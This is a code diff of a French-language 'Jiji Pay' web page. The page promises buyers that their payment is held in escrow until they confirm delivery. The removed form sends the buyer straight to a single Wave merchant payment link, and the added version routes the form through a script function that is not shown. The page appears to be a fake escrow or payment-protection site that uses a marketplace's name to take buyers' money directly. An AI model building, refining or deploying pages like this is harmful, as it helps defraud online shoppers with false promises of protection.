@@ -1,51 +1,4 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Jiji Pay</title>
-  <link rel="stylesheet" href="style.css">
-</head>
-
-<body>
-
-<header class="header">
-  <h1>🟢 Jiji Pay</h1>
-  <p>Votre argent est protégé jusqu'à réception de votre colis.</p>
-</header>
-
-<div class="container">
-
-<div class="card">
-<h2>100% Sécurisé</h2>
-<p>✔ Votre argent est conservé jusqu'à la confirmation de réception.</p>
-</div>
-
-<div class="card">
-<h2>Comment ça marche ?</h2>
-
-<div class="step">
-<b>1. Commandez</b><br>
-Remplissez le formulaire.
-</div>
-
-<div class="step">
-<b>2. Sécurisé</b><br>
-Jiji Pay garde votre argent.
-</div>
-
-<div class="step">
-<b>3. Confirmez</b><br>
-Colis reçu → vendeur payé.
-</div>
-
-</div>
-
-<div class="card">
-
-<h2>Votre commande</h2>
-
-<form action="https://pay.wave.com/m/M_ci_KSgOfOLiIMqV/c/ci/">
+<form id="paymentForm">
 
 <input type="text" placeholder="Nom du vendeur" required>
 
@@ -57,27 +10,8 @@ Colis reçu → vendeur payé.
 
 <input type="tel" placeholder="Votre téléphone" required>
 
-<button class="pay">
+<button type="button" class="pay" onclick="payer()">
 Passer la commande sécurisée
 </button>
 
 </form>
-
-<button class="cancel">
-Annuler la commande
-</button>
-
-</div>
-
-</div>
-
-<footer>
-
-Garantie Jiji Pay
-
-</footer>
-
-<script src="script.js"></script>
-
-</body>
-</html>
